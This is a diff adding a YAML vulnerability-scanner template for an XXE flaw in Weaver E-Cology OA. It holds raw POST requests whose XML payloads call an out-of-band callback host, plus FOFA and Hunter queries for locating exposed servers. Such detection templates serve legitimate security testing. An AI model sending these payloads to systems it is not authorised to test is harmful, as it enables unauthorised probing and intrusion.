@@ -1,0 +1,43 @@
+id: weaver-ecology-deleteuserrequestinfobyxml-xxe
+
+info:
+  name: 泛微 OA E-Cology deleteUserRequestInfoByXml - xxe
+  author: leadlife
+  severity: high
+  description: The initial filtering of user input for a certain feature in the Weaver E-cology system was not very robust, which resulted in the possibility of triggering XXE when processing user input.
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/131878446
+  metadata:
+    verified: true
+    fofa-qeury: app="泛微-OA（e-cology）"
+    hunter-query: product.name="泛微 e-cology 9.0 OA"
+  tags: weaver,ecology,xxe,oa,oob
+
+http:
+  - raw:
+      - |
+        POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
+        <M><syscode>&send;</syscode></M>
+
+      - |
+        POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
+        <M><syscode>&send;</syscode></M>
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
